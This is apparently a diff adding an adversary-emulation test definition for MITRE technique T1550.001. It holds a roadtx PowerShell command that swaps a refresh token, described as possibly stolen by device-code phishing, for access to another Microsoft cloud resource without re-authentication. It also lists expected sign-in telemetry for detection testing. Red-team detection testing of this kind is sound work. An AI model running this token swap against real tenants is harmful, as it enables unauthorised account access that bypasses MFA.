@@ -1,0 +1,57 @@
+attack_technique: T1550.001
+display_name: "Defense Evasion – Refresh Token Swap (Resource Pivoting)"
+atomic_tests:
+  - name: "Refresh token pivot to new resource via roadtx"
+    auto_generated_guid: e5f6a7b8-c9d0-1234-efab-234567890104
+    description: |
+      Takes a refresh token from a prior authentication (e.g., device-code
+      phish) and exchanges it for an access token to a different resource
+      without re-authentication. This pivots from one cloud resource to
+      another using a single stolen refresh token. Wraps roadtx refreshtokens.
+    supported_platforms:
+      - windows
+      - linux
+      - macos
+    input_arguments:
+      token_input_path:
+        description: "Path to existing roadtools token cache (from a prior atomic)."
+        type: Path
+      target_resource:
+        description: "Resource URI to pivot to."
+        type: String
+        default: "https://outlook.office.com"
+      tenant_id:
+        description: "Entra tenant ID of the lab tenant."
+        type: String
+        default: "00000000-0000-0000-0000-000000000000"
+      token_output_path:
+        description: "Path to write the new token for the target resource."
+        type: Path
+        default: "#{token_cache_path}"
+    executor:
+      name: powershell
+      command: |
+        roadtx refreshtokens `
+          --tokenfile '#{token_input_path}' `
+          --tenant '#{tenant_id}' `
+          --resource '#{target_resource}' `
+          --outfile '#{token_output_path}'
+    cleanup_command: |
+      if (Test-Path -LiteralPath '#{token_output_path}') {
+          Remove-Item -LiteralPath '#{token_output_path}' -Force
+      }
+    references:
+      - "https://dirkjanm.io/abusing-azure-ad-sso-with-the-on-behalf-of-flow/"
+    auth_profile: "refresh-token-swap"
+    defense_evasion: "Resource pivoting via refresh token; no additional MFA or credentials"
+    requires_token:
+      from: "device-code"
+      resource: "https://graph.microsoft.com"
+    expected_telemetry:
+      - source: entra_signin
+        match:
+          authenticationProtocol: "refreshToken"
+        within_minutes: 10
+    exercises_chokepoint:
+      id: "DC-EVAS-001"
+      url: "https://detectionchokepoints.com/evasion/refresh-token-pivot"
